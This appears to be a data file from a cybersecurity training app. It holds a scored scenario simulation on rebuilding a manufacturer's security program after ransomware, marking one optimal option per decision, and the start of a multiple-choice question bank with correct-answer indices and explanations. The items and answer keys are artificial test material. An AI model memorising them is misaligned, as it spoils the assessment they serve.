            "feedback": "Excellent approach. Governance structure enables everything else - clear accountability, decision-making authority, and resource allocation. Without unified governance, improvements in any area remain fragmented. Quick wins can happen within governance structure.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Security program integration starts with governance. Clear authority and accountability enable all other improvements.",
            "consequences": {
              "immediate": "Clear accountability and authority established",
              "security_impact": "Foundation for integrated security program",
              "business_impact": "Board sees structured approach; confidence increases"
            }
          },
          {
            "id": "c",
            "text": "Conduct comprehensive risk assessment across IT, OT, and supply chain before any changes",
            "feedback": "Risk assessment is important but not without governance to act on findings. A comprehensive assessment without clear decision-making authority results in a report that sits on a shelf. Establish governance, then conduct risk assessment within that framework.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Risk assessment should follow governance establishment so findings can be acted upon through defined decision processes.",
            "consequences": {
              "immediate": "Detailed risk inventory but unclear action path",
              "security_impact": "Risk identified but not managed",
              "business_impact": "Assessment delays action; no quick wins"
            }
          },
          {
            "id": "d",
            "text": "Implement zero trust architecture to prevent another ransomware incident",
            "feedback": "Zero trust is a valuable strategy but implementing architecture without governance creates another silo. Zero trust implementation requires organizational coordination that fragmented security can't provide. Architecture changes should follow program structure, not precede it.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Technical solutions require organizational foundation. Architecture changes need governance, accountability, and sustained operations to be effective.",
            "consequences": {
              "immediate": "Technical project without organizational alignment",
              "security_impact": "Partial implementation; inconsistent enforcement",
              "business_impact": "Expensive project without sustainable operations"
            }
          }
        ],
        "hints": [
          "What enables everything else to work effectively?",
          "Consider what caused the fragmentation in the first place"
        ]
      },
      {
        "id": "dp2",
        "sequence": 2,
        "title": "Governance Structure Design",
        "situation": "You've received CEO support to unify security governance. Now you need to design the structure. Key stakeholders have strong opinions:\n\n**CIO**: 'Security should report to IT. We have the technical expertise.'\n\n**VP Operations**: 'OT security must stay with Operations. IT doesn't understand manufacturing safety requirements.'\n\n**General Counsel**: 'Compliance needs to remain independent for objectivity.'\n\n**CFO**: 'I'm not adding headcount. Make it work with existing resources.'\n\nHow do you structure security governance?",
        "options": [
          {
            "id": "a",
            "text": "Security reports to CIO with dotted line to VP Operations for OT matters",
            "feedback": "CIO reporting perpetuates IT-centric security that missed OT risks. Dotted lines are weak and easily ignored. VP Operations won't accept IT authority over manufacturing safety. This structure doesn't solve the fundamental accountability problem.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Security reporting to IT creates IT-centric security. Manufacturing and OT environments need security authority that understands their context.",
            "consequences": {
              "immediate": "CIO gains authority but Operations resists",
              "security_impact": "OT security remains secondary consideration",
              "business_impact": "Political conflict; incomplete integration"
            }
          },
          {
            "id": "b",
            "text": "Create CISO role reporting to CEO, with security steering committee including all stakeholders",
            "feedback": "Excellent approach. CISO reporting to CEO provides appropriate authority and independence. Steering committee ensures stakeholder input and buy-in. This elevates security as enterprise function while maintaining necessary connections to IT, Operations, and Legal.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "CISO should report to CEO or Board for appropriate authority and independence. Steering committees provide stakeholder engagement without compromising security authority.",
            "consequences": {
              "immediate": "Clear security authority; stakeholder engagement",
              "security_impact": "Enterprise security perspective; balanced IT/OT focus",
              "business_impact": "Board confidence; unified accountability"
            }
          },
          {
            "id": "c",
            "text": "Maintain current structure but add coordination meetings between IT Security and OT Security",
            "feedback": "Coordination meetings without clear authority create discussion but not decisions. When IT Security and OT Security disagree, who decides? Current structure is the problem; meetings don't solve accountability gaps. This is incremental improvement, not transformation.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Coordination without authority isn't governance. Clear accountability and decision rights are essential for effective security programs.",
            "consequences": {
              "immediate": "More meetings but same structure",
              "security_impact": "Integration remains voluntary",
              "business_impact": "Board sees minimal change after incident"
            }
          },
          {
            "id": "d",
            "text": "Outsource security leadership to managed security provider for objective perspective",
            "feedback": "Security leadership is a core organizational capability. External providers lack organizational context and authority. They can augment capabilities but can't make governance decisions. Outsourcing leadership abdicates accountability that the Board just demanded.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Security governance must be internal for accountability. External resources augment capability but can't replace leadership accountability.",
            "consequences": {
              "immediate": "External expertise but internal accountability gap",
              "security_impact": "Security decisions lack organizational authority",
              "business_impact": "Board accountability requirement not met"
            }
          }
        ],
        "hints": [
          "Consider what reporting structure provides appropriate authority and independence",
          "Think about how to get stakeholder buy-in without compromising accountability"
        ]
      },
      {
        "id": "dp3",
        "sequence": 3,
        "title": "Enterprise Risk Framework",
        "situation": "With governance established, you need to implement enterprise security risk management. Currently:\n\n- IT maintains a vulnerability list prioritized by CVSS\n- OT has no formal risk assessment (relies on vendor security)\n- Supply chain risks managed ad-hoc by procurement\n- Business units don't participate in security risk discussions\n\nThe CFO asks: 'How do we prioritize security investments? We can't fund everything.'\n\nHow do you approach enterprise security risk management?",
        "options": [
          {
            "id": "a",
            "text": "Extend IT vulnerability management to include OT and supply chain",
            "feedback": "Vulnerability management is one input to risk, not risk management itself. CVSS scores don't capture business context, OT safety implications, or supply chain dependencies. Extending technical vulnerability tracking doesn't create enterprise risk perspective.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Vulnerability management is tactical. Risk management provides business context for investment prioritization.",
            "consequences": {
              "immediate": "Larger vulnerability list without business context",
              "security_impact": "Technical risks visible but business risks missed",
              "business_impact": "Investment prioritization still unclear"
            }
          },
          {
            "id": "b",
            "text": "Implement enterprise risk framework integrating IT, OT, supply chain, and business impact assessment",
            "feedback": "Excellent approach. Enterprise risk framework captures all risk domains (IT, OT, supply chain) with consistent methodology. Business impact assessment ensures risks are expressed in terms executives understand - production impact, financial loss, safety, reputation. This enables informed investment decisions.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Enterprise risk management integrates all risk domains with business context, enabling prioritization based on organizational impact.",
            "consequences": {
              "immediate": "Comprehensive risk visibility with business context",
              "security_impact": "All risk domains addressed systematically",
              "business_impact": "Clear investment prioritization based on business impact"
            }
          },
          {
            "id": "c",
            "text": "Focus on the risks that caused the ransomware incident first",
            "feedback": "Addressing incident-related risks is important but represents backward-looking risk management. Other significant risks may exist that weren't exposed by this incident. Risk management should be comprehensive, not reactive to the last incident.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Risk management should be comprehensive, not driven by the last incident. Fight the next battle, not the last one.",
            "consequences": {
              "immediate": "Ransomware-related risks addressed",
              "security_impact": "Other significant risks may be missed",
              "business_impact": "Next incident may come from different risk area"
            }
          },
          {
            "id": "d",
            "text": "Adopt industry risk framework (NIST RMF) and conduct formal assessment",
            "feedback": "Industry frameworks provide good structure, but NIST RMF is designed for federal systems and may not fit manufacturing well. Framework adoption should be tailored to organizational context. Additionally, framework adoption without business impact integration misses the investment prioritization need.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Risk frameworks should be adapted to organizational context. Manufacturing and OT environments have unique considerations.",
            "consequences": {
              "immediate": "Framework structure but may not fit manufacturing context",
              "security_impact": "Generic approach may miss industry-specific risks",
              "business_impact": "Assessment produces documentation but may not drive decisions"
            }
          }
        ],
        "hints": [
          "What does the CFO need to make investment decisions?",
          "Think about how IT risks, OT risks, and supply chain risks connect"
        ]
      },
      {
        "id": "dp4",
        "sequence": 4,
        "title": "IT/OT Security Convergence",
        "situation": "The ransomware attack exploited the IT-OT boundary. You need to integrate security across both environments while respecting operational constraints.\n\nThe OT Security Manager warns: 'We can't just deploy IT security tools in the plant. They'll crash PLCs, cause safety issues, and Operations will revolt.'\n\nThe IT Security Manager counters: 'We can't leave OT as a black box. We need visibility.'\n\nOperations leadership is skeptical: 'Last time IT touched the plant network, we had unplanned downtime.'\n\nHow do you approach IT/OT security convergence?",
        "options": [
          {
            "id": "a",
            "text": "Deploy IT security tools across OT networks for comprehensive visibility",
            "feedback": "IT security tools can disrupt OT systems. Active scanning can crash PLCs. Endpoint agents may conflict with real-time control software. Safety systems could be affected. OT environments require purpose-built security approaches that respect operational constraints.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "IT security tools aren't designed for OT environments. OT security requires passive monitoring and purpose-built approaches.",
            "consequences": {
              "immediate": "IT tools deployed but operational disruptions likely",
              "security_impact": "Some visibility but potential safety issues",
              "business_impact": "Operations loses trust; unplanned downtime"
            }
          },
          {
            "id": "b",
            "text": "Implement OT-specific passive monitoring with integration to unified SOC for correlated visibility",
            "feedback": "Excellent approach. OT-specific tools provide passive monitoring without disrupting operations. Integration with SOC enables correlated visibility across IT and OT. This respects operational constraints while achieving security goals. Operations sees security investment, not IT takeover.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "OT security requires passive monitoring, purpose-built tools, and integration with IT security for unified visibility. Respect operational constraints.",
            "consequences": {
              "immediate": "OT visibility without operational disruption",
              "security_impact": "Unified visibility across IT and OT; attack path detection",
              "business_impact": "Operations partnership; security without downtime"
            }
          },
          {
            "id": "c",
            "text": "Strengthen the IT-OT boundary and keep the networks completely separate",
            "feedback": "Complete separation is impractical given digital transformation requirements. IoT sensors, analytics, and remote monitoring require controlled IT-OT connectivity. Air-gapping eliminates business value. The goal is controlled integration, not separation.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "IT-OT convergence is business reality. Security strategy must enable controlled integration, not prevent it.",
            "consequences": {
              "immediate": "Stronger segmentation but limited functionality",
              "security_impact": "Reduced attack surface but still need visibility",
              "business_impact": "Digital transformation initiatives blocked"
            }
          },
          {
            "id": "d",
            "text": "Let OT team continue managing OT security independently with better coordination",
            "feedback": "Independent management perpetuates the gaps that enabled the ransomware attack. Coordination without integration misses attack paths that cross IT-OT boundaries. The incident proved that separate management creates security gaps.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Coordination is not integration. Security visibility must span IT and OT to detect attacks that cross boundaries.",
            "consequences": {
              "immediate": "Status quo with better communication",
              "security_impact": "IT-OT attack paths remain",
              "business_impact": "Board sees insufficient change after incident"
            }
          }
        ],
        "hints": [
          "How do you get visibility without causing operational disruption?",
          "Consider what's unique about OT environments and security requirements"
        ]
      },
      {
        "id": "dp5",
        "sequence": 5,
        "title": "Supply Chain Risk Integration",
        "situation": "Your supplier risk assessment reveals concerning gaps:\n\n- Critical component supplier (sole source) has no security program\n- Software vendor for MES system was recently breached\n- Cloud analytics provider processes production data with unclear security controls\n- 400+ suppliers with no systematic risk assessment\n\nThe VP Supply Chain says: 'We can't assess 400 suppliers. We barely have resources to manage procurement.'\n\nHow do you approach supply chain security risk?",
        "options": [
          {
            "id": "a",
            "text": "Require all suppliers to complete security questionnaires annually",
            "feedback": "Requiring questionnaires from 400+ suppliers creates massive burden without proportionate value. Many suppliers are low-risk. Questionnaires measure what suppliers claim, not actual security. Resources should focus on high-risk suppliers with meaningful assessment.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Supply chain security should be risk-tiered. Same assessment for all suppliers wastes resources on low-risk relationships.",
            "consequences": {
              "immediate": "Massive questionnaire burden",
              "security_impact": "Questionnaire responses don't ensure security",
              "business_impact": "Supply Chain team overwhelmed; procurement delayed"
            }
          },
          {
            "id": "b",
            "text": "Implement tiered supply chain risk program focusing assessment effort on critical and high-risk suppliers",
            "feedback": "Excellent approach. Tier suppliers by criticality and risk, then apply proportionate assessment. Critical suppliers (sole source, system access) get comprehensive assessment. Low-risk suppliers get standard contract terms. This focuses resources where risk is highest.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Supply chain risk programs should tier suppliers and apply proportionate assessment based on criticality and risk level.",
            "consequences": {
              "immediate": "Focused assessment on highest-risk suppliers",
              "security_impact": "Critical supply chain risks identified and managed",
              "business_impact": "Proportionate burden; Supply Chain partnership"
            }
          },
          {
            "id": "c",
            "text": "Focus only on IT vendors since they have direct system access",
            "feedback": "IT vendors are important but not the only supply chain risk. Component suppliers can introduce counterfeit parts. Software embedded in products creates supply chain risk. Logistics disruption affects production. Supply chain security spans multiple vendor types.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Supply chain security spans IT vendors, component suppliers, software providers, and logistics partners. Don't limit scope to IT.",
            "consequences": {
              "immediate": "IT vendor risks managed; others ignored",
              "security_impact": "Component, software, and logistics risks unaddressed",
              "business_impact": "Supply chain disruption from unmanaged risks"
            }
          },
          {
            "id": "d",
            "text": "Require cyber insurance from all suppliers to transfer risk",
            "feedback": "Cyber insurance transfers financial risk but doesn't prevent incidents. A supplier breach still affects your operations regardless of their insurance. Insurance is one risk treatment but doesn't replace security assessment and requirements. Risk transfer has limits.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Insurance transfers financial risk but doesn't prevent incidents or protect operations. It complements but doesn't replace security requirements.",
            "consequences": {
              "immediate": "Insurance requirement added to contracts",
              "security_impact": "Supplier security unchanged",
              "business_impact": "Financial protection but operational risk remains"
            }
          }
        ],
        "hints": [
          "How do you focus limited resources on the most significant risks?",
          "Consider different types of supply chain risk beyond IT vendors"
        ]
      },
      {
        "id": "dp6",
        "sequence": 6,
        "title": "Compliance Integration",
        "situation": "Your compliance landscape includes:\n\n- SOX ITGC (ERP systems)\n- GDPR (European operations and customer data)\n- Industry customer requirements (various questionnaires)\n- Export controls (defense-related products)\n- Emerging regulations (EU NIS2 Directive affecting manufacturing)\n\nCurrently, each compliance requirement is handled separately with significant duplication. The General Counsel asks: 'Can we streamline this? We're answering similar questions for every requirement.'\n\nHow do you approach compliance integration?",
        "options": [
          {
            "id": "a",
            "text": "Create dedicated compliance track for each regulation to ensure nothing is missed",
            "feedback": "Dedicated tracks create duplication and inefficiency. Many controls satisfy multiple requirements - access controls, encryption, logging. Separate tracks mean demonstrating the same control multiple times. This increases burden without improving compliance.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Siloed compliance programs are inefficient. Integrated control frameworks reduce duplication while ensuring coverage.",
            "consequences": {
              "immediate": "Clear ownership but massive duplication",
              "security_impact": "Same controls documented differently for each regulation",
              "business_impact": "Expensive compliance; audit fatigue"
            }
          },
          {
            "id": "b",
            "text": "Build unified control framework mapped to all requirements, with gap analysis for unique requirements",
            "feedback": "Excellent approach. Unified control framework identifies common requirements. One access control implementation satisfies SOX, GDPR, and customer requirements. Gap analysis identifies unique requirements needing additional controls. This reduces effort while ensuring comprehensive coverage.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Control framework integration maps security controls to multiple compliance requirements, reducing duplication while ensuring all requirements are met.",
            "consequences": {
              "immediate": "Upfront mapping effort but long-term efficiency",
              "security_impact": "Consistent controls across all requirements",
              "business_impact": "Reduced compliance burden; efficient resource use"
            }
          },
          {
            "id": "c",
            "text": "Focus on SOX since it has the most significant consequences for a public company",
            "feedback": "SOX is important but GDPR violations can reach 4% of global revenue. Export control violations carry criminal penalties. Customer requirements affect revenue. All compliance requirements matter; efficiency comes from integration, not prioritization that creates gaps.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "All compliance requirements are important. Address all through integrated approach, not by prioritizing some over others.",
            "consequences": {
              "immediate": "SOX compliance strong; other areas weaker",
              "security_impact": "Compliance gaps in non-SOX areas",
              "business_impact": "GDPR, export control, and customer risks unmanaged"
            }
          },
          {
            "id": "d",
            "text": "Outsource compliance management to specialized firm for expertise",
            "feedback": "External expertise is valuable but compliance management must remain internal for accountability and organizational knowledge. Consultants can assist with specific assessments but ongoing compliance requires internal ownership. Outsourcing creates dependency and knowledge gaps.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Compliance management is core capability requiring internal ownership. External resources augment but don't replace internal program.",
            "consequences": {
              "immediate": "External expertise acquired",
              "security_impact": "Compliance managed but organizational knowledge weak",
              "business_impact": "Ongoing consultant cost; internal capability not built"
            }
          }
        ],
        "hints": [
          "What do these different requirements have in common?",
          "Think about efficiency without sacrificing coverage"
        ]
      },
      {
        "id": "dp7",
        "sequence": 7,
        "title": "Security Investment Prioritization",
        "situation": "Budget planning is underway. Based on your risk assessment, you've identified investment needs:\n\n**Critical:**\n- OT passive monitoring ($400K)\n- IT-OT segmentation improvements ($600K)\n- Incident response retainer ($150K/year)\n\n**High:**\n- Supply chain risk platform ($200K)\n- GRC platform ($300K)\n- Additional SOC analyst ($120K/year)\n\n**Medium:**\n- Security awareness enhancement ($100K)\n- Penetration testing expansion ($80K/year)\n\nThe CFO has allocated $1M for security investments. Total requests exceed $1.9M. How do you approach investment prioritization?",
        "options": [
          {
            "id": "a",
            "text": "Present all requests and let executive team decide what to fund",
            "feedback": "Presenting a wish list without recommendation abdicates security leadership responsibility. Executives expect security leader to prioritize based on risk expertise. Providing all requests without recommendation creates decision paralysis and may result in suboptimal allocation.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Security leaders should provide prioritized recommendations based on risk assessment, not just present options for others to decide.",
            "consequences": {
              "immediate": "Executive decision without expert input",
              "security_impact": "Investment may not align with risk priorities",
              "business_impact": "Security seen as not able to prioritize"
            }
          },
          {
            "id": "b",
            "text": "Develop risk-based prioritization with clear business case, recommend specific investments within budget, and identify alternatives for unfunded items",
            "feedback": "Excellent approach. Risk-based prioritization demonstrates security alignment with business risk. Clear business cases justify investments. Recommendations show leadership. Identifying alternatives for unfunded items shows fiscal responsibility while highlighting remaining risk.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Security investment requests should include risk-based prioritization, clear business case, specific recommendation, and alternatives for items not funded.",
            "consequences": {
              "immediate": "Clear recommendation with risk justification",
              "security_impact": "Highest risks addressed first",
              "business_impact": "Demonstrates security leadership and business alignment"
            }
          },
          {
            "id": "c",
            "text": "Request full $1.9M budget, emphasizing that anything less creates unacceptable risk",
            "feedback": "Requesting significantly more than allocated budget without prioritization appears tone-deaf to business constraints. Claiming all investments are essential undermines credibility when that's clearly not true. Work within constraints while clearly communicating remaining risk.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Security leaders must work within budget constraints while clearly communicating the risk implications of funding decisions.",
            "consequences": {
              "immediate": "Request likely rejected; credibility damaged",
              "security_impact": "May receive nothing if seen as unrealistic",
              "business_impact": "Security seen as disconnected from business reality"
            }
          },
          {
            "id": "d",
            "text": "Accept the $1M constraint and fund only what fits, starting with the most expensive items first",
            "feedback": "Starting with most expensive items ignores risk prioritization. The most expensive investment isn't necessarily the most important. Prioritization should be based on risk reduction, not cost. Lower-cost high-impact investments may be more valuable than expensive ones.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Investment prioritization should maximize risk reduction, not simply fund the most expensive items or fund in order of request.",
            "consequences": {
              "immediate": "Budget used but not optimally allocated",
              "security_impact": "Higher-risk items may be unfunded",
              "business_impact": "Investment doesn't maximize risk reduction per dollar"
            }
          }
        ],
        "hints": [
          "What would you advise if you were in the CFO's position?",
          "How do you maximize risk reduction within budget constraints?"
        ]
      },
      {
        "id": "dp8",
        "sequence": 8,
        "title": "Security Metrics and Board Reporting",
        "situation": "The Board Audit Committee has scheduled quarterly security updates. The Board Chair says: 'We're not technical people. We need to understand our security posture, the risks we face, and whether our investments are working.'\n\nPrevious security reports were technical dashboards that left Board members confused.\n\nHow do you approach Board security reporting?",
        "options": [
          {
            "id": "a",
            "text": "Provide detailed technical metrics so the Board has complete information",
            "feedback": "Technical metrics without business context overwhelm Board members and don't answer their questions. Boards need to understand risk posture and program effectiveness, not vulnerability counts or patch percentages. Translation to business impact is essential.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Board reporting requires translation of technical metrics to business context. Focus on risk posture and program effectiveness.",
            "consequences": {
              "immediate": "Confused Board members",
              "security_impact": "Board can't provide effective oversight",
              "business_impact": "Security seen as unable to communicate"
            }
          },
          {
            "id": "b",
            "text": "Develop risk-focused dashboard with business impact metrics, trend indicators, and key decisions needed",
            "feedback": "Excellent approach. Risk-focused reporting translates security into business terms. Trend indicators show whether things are improving. Highlighting decisions needed engages the Board in governance. This enables Board oversight without overwhelming with technical detail.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Board reporting should focus on risk posture, business impact, trends, and decisions needed. Technical detail in appendix for those who want it.",
            "consequences": {
              "immediate": "Board understands security posture",
              "security_impact": "Effective Board oversight of security program",
              "business_impact": "Security positioned as business function"
            }
          },
          {
            "id": "c",
            "text": "Report only on incidents and compliance status since those are the outcomes that matter",
            "feedback": "Incident and compliance reporting is backward-looking. Boards need forward-looking risk posture to fulfill fiduciary duty. No incidents doesn't mean good security - could mean poor detection. Program maturity and emerging threats are also important.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Board reporting should include leading indicators (program maturity, emerging risks) not just lagging indicators (incidents, compliance).",
            "consequences": {
              "immediate": "Simple reporting but incomplete picture",
              "security_impact": "Emerging risks not communicated",
              "business_impact": "Board surprised when incidents occur despite 'good' reports"
            }
          },
          {
            "id": "d",
            "text": "Minimize reporting to avoid creating liability; less documentation is safer",
            "feedback": "Boards have fiduciary duty requiring security oversight. Minimal reporting doesn't reduce liability - it increases it by demonstrating inadequate governance. Courts and regulators expect Board oversight of cybersecurity. Good documentation shows due care.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Board oversight of cybersecurity is expected and required. Appropriate reporting demonstrates governance, not liability.",
            "consequences": {
              "immediate": "Minimal reporting effort",
              "security_impact": "Board cannot provide oversight",
              "business_impact": "Increased liability from inadequate governance; regulatory concern"
            }
          }
        ],
        "hints": [
          "What do Board members need to fulfill their oversight responsibilities?",
          "Think about the difference between informing and overwhelming"
        ]
      },
      {
        "id": "dp9",
        "sequence": 9,
        "title": "Security Culture and Awareness",
        "situation": "Your program assessment identified that security awareness varies significantly:\n\n- IT staff have strong security awareness\n- Manufacturing floor workers see security as obstacle to production\n- Executives click on phishing simulations at high rates\n- Engineers share credentials for convenience\n\nThe CHRO asks: 'How do we build security culture that extends beyond IT? We can't just mandate training.'\n\nHow do you approach security culture transformation?",
        "options": [
          {
            "id": "a",
            "text": "Implement mandatory annual security training for all employees",
            "feedback": "Mandatory annual training is necessary for compliance but doesn't change culture. Click-through training creates compliance evidence, not behavior change. Manufacturing workers won't change behavior from IT-focused training. Culture requires more than training.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Training is one component of security culture but doesn't create culture change alone. Culture requires sustained, multi-faceted approach.",
            "consequences": {
              "immediate": "Training completion metrics improve",
              "security_impact": "Behavior unchanged",
              "business_impact": "Compliance checkbox but cultural resistance continues"
            }
          },
          {
            "id": "b",
            "text": "Multi-pronged approach: role-specific training, visible leadership commitment, operational integration, and positive reinforcement",
            "feedback": "Excellent approach. Different roles need different messages and delivery methods. Executive visible commitment sets tone from top. Integrating security into operations makes it part of the job, not separate burden. Positive reinforcement builds culture better than punishment.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Security culture requires leadership commitment, role-specific engagement, operational integration, and sustained reinforcement over time.",
            "consequences": {
              "immediate": "Culture transformation initiative launched",
              "security_impact": "Behavior changes as culture shifts",
              "business_impact": "Security becomes part of how work gets done"
            }
          },
          {
            "id": "c",
            "text": "Focus on manufacturing floor since that's where security culture is weakest",
            "feedback": "Manufacturing needs attention, but executive phishing susceptibility is higher risk. Security culture must span the organization. Focusing on one group while executives remain vulnerable sends mixed messages. Start with leadership to model expected behavior.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Security culture must start from the top. Executive behavior sets the tone; they must model expected behavior.",
            "consequences": {
              "immediate": "Manufacturing focus but executive gap remains",
              "security_impact": "High-value targets (executives) remain vulnerable",
              "business_impact": "Workers see executives not following rules"
            }
          },
          {
            "id": "d",
            "text": "Implement strict enforcement with consequences for security violations",
            "feedback": "Punishment-focused approaches create fear but not engagement. Workers will hide security incidents rather than report them. Manufacturing floor will see security as adversary. Effective culture uses positive reinforcement with enforcement as last resort.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Punishment-focused security creates resistance and hides problems. Positive culture encourages reporting and engagement.",
            "consequences": {
              "immediate": "Visible compliance but underground resistance",
              "security_impact": "Incidents hidden rather than reported",
              "business_impact": "Adversarial relationship with security"
            }
          }
        ],
        "hints": [
          "What actually changes behavior in an organization?",
          "Consider how different groups interact with security differently"
        ]
      },
      {
        "id": "dp10",
        "sequence": 10,
        "title": "Program Sustainability",
        "situation": "After 18 months, your integrated security program shows results:\n\n- Unified governance operational\n- IT/OT security integrated with SOC visibility\n- Risk framework implemented\n- No major security incidents\n- Board confidence restored\n\nThe CEO asks in your annual review: 'We've made great progress. How do we sustain this? What's the vision for the next 3 years?'\n\nHow do you position the security program for long-term success?",
        "options": [
          {
            "id": "a",
            "text": "Maintain current state; we've built a solid program that just needs ongoing operation",
            "feedback": "Maintaining current state leads to stagnation. Threats evolve, business changes, and regulations expand. A program that isn't advancing is falling behind. Continuous improvement is essential for security program sustainability.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Security programs must continuously improve. The threat landscape and business environment change constantly.",
            "consequences": {
              "immediate": "Reduced change management burden",
              "security_impact": "Program effectiveness degrades over time",
              "business_impact": "Eventually overtaken by evolving threats and requirements"
            }
          },
          {
            "id": "b",
            "text": "Develop multi-year roadmap advancing maturity, enabling business initiatives, and adapting to emerging risks",
            "feedback": "Excellent approach. Multi-year roadmap provides direction and enables planning. Advancing maturity demonstrates continuous improvement. Enabling business initiatives positions security as enabler, not blocker. Adapting to emerging risks keeps program relevant.",
            "is_optimal": true,
            "points": 25,
            "learning_note": "Sustainable security programs have multi-year vision with continuous maturity advancement and business alignment.",
            "consequences": {
              "immediate": "Clear vision and direction",
              "security_impact": "Continuous program improvement",
              "business_impact": "Security positioned as strategic business enabler"
            }
          },
          {
            "id": "c",
            "text": "Focus on cost optimization now that the crisis is past; reduce investment to maintenance levels",
            "feedback": "Reducing investment after crisis is natural but dangerous. The crisis created investment appetite that may not return. Security requires sustained investment. Cost optimization should improve efficiency, not reduce capability.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Post-crisis is opportunity to lock in sustainable investment, not reduce to pre-crisis inadequate levels.",
            "consequences": {
              "immediate": "Short-term cost reduction",
              "security_impact": "Capability degradation begins",
              "business_impact": "Higher cost when next incident requires rebuild"
            }
          },
          {
            "id": "d",
            "text": "Pursue security certifications (ISO 27001, SOC 2) to validate program maturity",
            "feedback": "Certifications can be valuable but are means, not ends. Pursuing certifications for their own sake diverts resources from actual security improvement. Certifications should support business objectives (customer requirements) not be the goal themselves.",
            "is_optimal": false,
            "points": 5,
            "learning_note": "Certifications are tools for specific purposes (customer requirements, competitive advantage), not goals in themselves.",
            "consequences": {
              "immediate": "Certification pursuit begins",
              "security_impact": "Resources diverted to certification from improvement",
              "business_impact": "Certification achieved but may not drive business value"
            }
          }
        ],
        "hints": [
          "What keeps a security program relevant over time?",
          "Think about how to position security as enabler, not just protector"
        ]
      }
    ],
    "glossary": {
      "IT_OT_convergence": "Integration of information technology and operational technology security",
      "OT": "Operational Technology - systems controlling physical processes (ICS, SCADA, PLCs)",
      "passive_monitoring": "Network monitoring that observes traffic without actively probing systems",
      "enterprise_risk_management": "Organization-wide approach to identifying, assessing, and managing risks",
      "security_steering_committee": "Executive body providing strategic security direction and oversight",
      "supply_chain_tiering": "Categorizing suppliers by criticality to apply proportionate risk management",
      "risk_appetite": "Amount and type of risk an organization is willing to accept",
      "security_culture": "Shared values, beliefs, and behaviors regarding security throughout an organization",
      "maturity_advancement": "Systematic improvement of security program capabilities over time",
      "business_enablement": "Positioning security to support rather than hinder business objectives"
    },
    "outcomes": {
      "optimal_path_summary": "You transformed Nexus Manufacturing's fragmented security program into an integrated enterprise function. By establishing unified governance, implementing comprehensive risk management across IT, OT, and supply chain, and building sustainable security culture, you addressed the root causes of the ransomware incident while positioning security as a business enabler. The program now provides consistent protection across all environments with clear accountability and executive support.",
      "key_achievements": [
        "Unified security governance with CISO authority and steering committee",
        "Integrated IT/OT security with passive monitoring and SOC visibility",
        "Enterprise risk framework spanning IT, OT, and supply chain",
        "Tiered supply chain risk program focusing on critical suppliers",
        "Compliance framework integration reducing duplication",
        "Risk-based investment prioritization with business case",
        "Effective Board reporting enabling governance oversight",
        "Security culture transformation across all workforce segments",
        "Multi-year strategic roadmap for sustainable program"
      ],
      "lessons_learned": [
        "Security program integration starts with governance structure",
        "IT and OT security must be integrated while respecting operational constraints",
        "Risk management requires business context for investment prioritization",
        "Supply chain security should be tiered based on criticality and risk",
        "Compliance integration reduces burden while ensuring coverage",
        "Board reporting requires translation to business impact",
        "Security culture requires leadership commitment and role-specific engagement",
        "Sustainable programs need multi-year vision with continuous improvement"
      ],
      "connections_to_other_scenarios": [
        "Security Governance (D5-SIM-001) - Detailed governance structure development",
        "Risk Management (D5-SIM-002) - Comprehensive risk assessment methodology",
        "Third-Party Risk (D5-SIM-003) - Supply chain risk management details",
        "Compliance (D5-SIM-004) - Compliance framework integration",
        "SOC Operations (D4-SIM-001) - SOC integration for IT/OT monitoring"
      ]
    },
    "max_score": 250,
    "passing_score": 150
  }
];


// ═══════════════════════════════════════════════════════════════
// QUESTION DATA (250 questions, 50 per domain)
// ═══════════════════════════════════════════════════════════════
const QUESTIONS = [
  // Domain 1 Questions (50)
  { id: 'D1-Q001', domain: 1, question: 'Which type of security control is implemented through technology and automated systems?', options: ['Managerial', 'Operational', 'Technical', 'Physical'], correct: 2, explanation: 'Technical controls (also called logical controls) are implemented through technology such as firewalls, encryption, and access control systems.' },
  { id: 'D1-Q002', domain: 1, question: 'A security guard checking IDs at a building entrance is an example of which type of control?', options: ['Technical', 'Managerial', 'Physical', 'Corrective'], correct: 2, explanation: 'Security guards are physical controls - tangible mechanisms that protect physical assets and personnel.' },
  { id: 'D1-Q003', domain: 1, question: 'Which control type is designed to identify security incidents during or after they occur?', options: ['Preventive', 'Detective', 'Corrective', 'Deterrent'], correct: 1, explanation: 'Detective controls identify incidents during or after occurrence, such as IDS, log monitoring, and security cameras.' },
